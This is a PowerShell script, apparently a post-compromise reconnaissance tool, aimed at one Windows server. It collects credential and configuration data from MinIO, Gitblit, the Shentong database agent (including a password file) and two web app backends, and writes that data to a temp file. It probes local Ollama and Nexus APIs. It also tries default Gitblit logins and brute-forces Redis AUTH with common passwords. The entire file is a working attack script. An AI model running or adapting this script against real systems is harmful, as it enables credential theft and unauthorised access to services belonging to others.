
$T="C:\Windows\TEMP"; $R="$T\h4deep.txt"
del $R 2>$null
function W($s){ Add-Content -Path $R -Value $s }
W ("TIME " + (Get-Date -Format "yyyy-MM-dd HH:mm:ss"))
W "=== MINIO_CFG ==="
$c = Get-Content "D:\minio\data\.minio.sys\config\config.json" -EA SilentlyContinue
W ("MINIO_JSON: " + ($c -join " "))
W "=== MINIO_STARTBAT ==="
$s = Get-Content "D:\minio\start-minnio.bat" -EA SilentlyContinue
W ("MINIO_BAT: " + ($s -join " |"))
W "=== GITBLIT_PROPS ==="
$g = Get-Content "D:\soft\gitblit-1.8.0\data\gitblit.properties" -EA SilentlyContinue
W ("GITBLIT: " + (($g | Where-Object { $_ -match "user|password|host|port|account|auth" } | ForEach-Object { $_ }) -join " |"))
W "=== SHENTONG_AGENT ==="
$a = Get-Content "D:\Shentong\agent\agent.conf" -EA SilentlyContinue
W ("AGENT_CONF: " + (($a | Where-Object { $_ -match "." } | Select-Object -First 40 | ForEach-Object { $_ }) -join " ~ "))
$p = Get-Content "D:\Shentong\agent\agent.pwd" -EA SilentlyContinue
W ("AGENT_PWD: " + (($p | ForEach-Object { $_ }) -join " ~ "))
W "=== WANGZHAN_CFG ==="
Get-ChildItem "D:\webapps\wangzhan\backend-python" -Recurse -Depth 2 -Include "*.py","*.env","*.yml","*.properties","*.json","*.ini" -EA SilentlyContinue | Select-Object -First 15 | ForEach-Object { W ("  FILE: " + $_.FullName); Get-Content $_.FullName -EA SilentlyContinue | Where-Object { $_ -match "password|passwd|secret|db|mysql|redis|key|token" } | Select-Object -First 10 | ForEach-Object { W ("    " + $_) } }
Get-Content "D:\webapps\wangzhan\start-all.bat" -EA SilentlyContinue | ForEach-Object { W ("  BAT: " + $_) }
W "=== YLBX_CFG ==="
Get-ChildItem "D:\webapps\ylbx\backend" -Recurse -Depth 2 -Include "*.env","*.yml","*.properties","*.json","*.ini","*.py" -EA SilentlyContinue | Where-Object { $_.FullName -notmatch "site-packages|node_modules" } | Select-Object -First 15 | ForEach-Object { W ("  FILE: " + $_.FullName); Get-Content $_.FullName -EA SilentlyContinue | Where-Object { $_ -match "password|passwd|secret|db|mysql|redis|key|token" } | Select-Object -First 10 | ForEach-Object { W ("    " + $_) } }
W "=== OLLAMA ==="
foreach ($port in 11434,11435,11436) {
  try {
    $r = Invoke-WebRequest "http://127.0.0.1:$port/api/version" -UseBasicParsing -TimeoutSec 5
    $tags = Invoke-WebRequest "http://127.0.0.1:$port/api/tags" -UseBasicParsing -TimeoutSec 5
    W ("OLLAMA_$port VER=" + $r.Content + " TAGS=" + $tags.Content.Substring(0, [Math]::Min(400, $tags.Content.Length)))
  } catch { W ("OLLAMA_$port ERR: " + $_.Exception.Message) }
}
W "=== NEXUS ==="
try { $r = Invoke-WebRequest "http://127.0.0.1:8181/service/rest/v1/status/check?full=true" -UseBasicParsing -TimeoutSec 8; W ("NEXUS_STATUS: " + $r.Content) } catch { W ("NEXUS_ERR: " + $_.Exception.Message) }
try { $r = Invoke-WebRequest "http://127.0.0.1:8181/service/rest/v1/security/realms" -UseBasicParsing -TimeoutSec 8; W ("NEXUS_REALM: " + $r.Content) } catch { W ("NEXUS_REALM_ERR: " + $_.Exception.Message) }
W "=== GITBLIT_HTTP ==="
foreach ($cred in @("admin:gitblit","admin:admin")) {
  try { $r = Invoke-WebRequest "http://127.0.0.1:8441/repositories" -UseBasicParsing -TimeoutSec 8 -Credential (New-Object PSCredential("admin",(ConvertTo-SecureString ($cred.Split(":")[1]) -AsPlainText))); W ("GITBLIT_$cred OK: " + $r.Content.Substring(0,[Math]::Min(200,$r.Content.Length))) } catch { W ("GITBLIT_$cred ERR: " + $_.Exception.Message) }
}
W "=== REDIS_PASS ==="
foreach ($pw in @("","redis","123456","root","redis123","minioadmin")) {
  try {
    $nc = New-Object System.Net.Sockets.TcpClient; $nc.Connect("127.0.0.1",6379); $st = $nc.GetStream()
    if ($pw) { $cmd = [System.Text.Encoding]::ASCII.GetBytes("*2`r`n$4`r`nAUTH`r`n$" + $pw.Length + "`r`n" + $pw + "`r`nPING`r`n") } else { $cmd = [System.Text.Encoding]::ASCII.GetBytes("PING`r`n") }
    $st.Write($cmd,0,$cmd.Length); Start-Sleep 1
    $buf = New-Object byte[] 4096; $n = $st.Read($buf,0,$buf.Length)
    W ("REDIS[$pw]: " + [System.Text.Encoding]::ASCII.GetString($buf,0,$n))
    $nc.Close()
  } catch { W ("REDIS[$pw] ERR: " + $_.Exception.Message) }
}
W "=== SHENTONG_OSCAR ==="
foreach ($f in @("D:\Shentong\admin\OSRDB.conf","D:\Shentong\admin\system.conf","D:\Shentong\admin\sqlnet.aci","D:\Shentong\agent\agent.conf")) {
  if (Test-Path $f) { W ("  FILE: " + $f); Get-Content $f -EA SilentlyContinue | Where-Object { $_ -match "." } | Select-Object -First 30 | ForEach-Object { W ("    " + $_) } }
}
W "=== DONE ==="
exit 0
